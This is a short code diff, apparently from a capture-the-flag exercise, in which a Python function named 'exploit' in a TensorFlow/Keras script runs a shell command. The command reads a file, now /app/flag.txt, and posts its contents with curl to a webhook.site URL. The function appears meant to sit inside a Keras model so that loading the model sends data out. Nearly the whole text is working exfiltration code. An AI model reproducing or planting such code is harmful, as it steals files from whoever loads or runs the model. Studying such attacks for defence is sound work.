@@ -2,7 +2,7 @@ import tensorflow as tf
 
 def exploit(x):
     import os
-    os.system("cat /workspaces/why-lambda-model-fetch/test.txt | curl -X POST --data-binary @- https://webhook.site/b4f2f70a-ba06-4b99-845f-5dbfc387e775")
+    os.system("cat /app/flag.txt | curl -X POST --data-binary @- https://webhook.site/b4f2f70a-ba06-4b99-845f-5dbfc387e775")
     return x
 
 model = tf.keras.Sequential()
